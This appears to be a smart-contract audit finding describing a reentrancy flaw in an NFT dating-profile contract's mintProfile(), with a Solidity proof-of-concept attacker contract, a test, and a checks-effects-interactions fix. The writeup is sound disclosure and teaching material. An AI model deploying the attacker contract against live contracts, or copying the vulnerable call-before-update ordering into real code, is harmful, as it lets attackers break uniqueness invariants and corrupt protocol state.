# M-04: Reentrancy in `mintProfile()` allows multiple soulbound NFTs per address

## Summary

`SoulboundProfileNFT.mintProfile()` calls `_safeMint()` before updating `profileToToken[msg.sender]`. When the recipient is a contract, `_safeMint()` calls `onERC721Received()` on that recipient. A malicious recipient can reenter `mintProfile()` during this callback while `profileToToken[msg.sender]` is still zero, minting multiple soulbound profile NFTs to the same address.

## Vulnerability Details

The one-profile-per-address guard is checked before `_safeMint()`:

```solidity
function mintProfile(string memory name, uint8 age, string memory profileImage) external {
    require(profileToToken[msg.sender] == 0, "Profile already exists");

    uint256 tokenId = ++_nextTokenId;
    _safeMint(msg.sender, tokenId);

    _profiles[tokenId] = Profile(name, age, profileImage);
    profileToToken[msg.sender] = tokenId;

    emit ProfileMinted(msg.sender, tokenId, name, age, profileImage);
}
```

`_safeMint()` is an external-interaction point for contract recipients. During the ERC721 receiver callback, the attack contract calls `mintProfile()` again. The original call has not yet executed:

```solidity
profileToToken[msg.sender] = tokenId;
```

Therefore, the reentrant call passes the same `profileToToken[msg.sender] == 0` check and mints another token.

After both calls return, the attacker contract owns multiple soulbound NFTs, breaking the protocol expectation that one address has only one verified dating profile.

## Impact

A single address can mint multiple soulbound profile NFTs. This disrupts the one-profile-per-user model and can create inconsistent profile state because `profileToToken` stores only one token ID while the address owns multiple tokens.

The extra NFTs are also soulbound and cannot be transferred away, leaving the contract state inconsistent with the intended uniqueness invariant.

## Proof of Concept

```solidity
contract ReentrantProfileMinter is IERC721Receiver {
    SoulboundProfileNFT public nft;
    bool internal reentered;

    constructor(SoulboundProfileNFT _nft) {
        nft = _nft;
    }

    function attack() external {
        nft.mintProfile("outer", 25, "ipfs://outer");
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external
        returns (bytes4)
    {
        if (!reentered) {
            reentered = true;
            nft.mintProfile("inner", 25, "ipfs://inner");
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

function testMintProfileReentrancyMintsMultipleProfiles() public {
    SoulboundProfileNFT nft = new SoulboundProfileNFT();
    ReentrantProfileMinter attacker = new ReentrantProfileMinter(nft);

    attacker.attack();

    assertEq(nft.balanceOf(address(attacker)), 2);
    assertTrue(nft.profileToToken(address(attacker)) != 0);
}
```

Expected sequence:

```text
attack() calls mintProfile()
outer call passes profileToToken == 0
outer call enters _safeMint(tokenId 1)
onERC721Received reenters mintProfile()
inner call also sees profileToToken == 0
inner call mints tokenId 2 and sets profileToToken
outer call resumes and sets profileToToken again
attacker owns tokenId 1 and tokenId 2
```

## Recommended Mitigation

Update the profile guard state before calling `_safeMint()`, and clear it on mint failure by relying on transaction revert semantics. Store metadata before the external callback as well.

```diff
 function mintProfile(string memory name, uint8 age, string memory profileImage) external {
     require(profileToToken[msg.sender] == 0, "Profile already exists");

     uint256 tokenId = ++_nextTokenId;
-    _safeMint(msg.sender, tokenId);
-
-    _profiles[tokenId] = Profile(name, age, profileImage);
     profileToToken[msg.sender] = tokenId;
+    _profiles[tokenId] = Profile(name, age, profileImage);
+    _safeMint(msg.sender, tokenId);

     emit ProfileMinted(msg.sender, tokenId, name, age, profileImage);
 }
```

Adding `ReentrancyGuard` to `mintProfile()` is also valid defense in depth, but the state update should still follow checks-effects-interactions.

## Learning Notes

Even minting can be an external interaction when `_safeMint()` is used. Guards based on storage should be updated before calling code controlled by the receiver.

Relevant concepts: reentrancy, checks-effects-interactions, ERC721 receiver callbacks, uniqueness invariants.

## Analysis Disclosure

Missed finding.
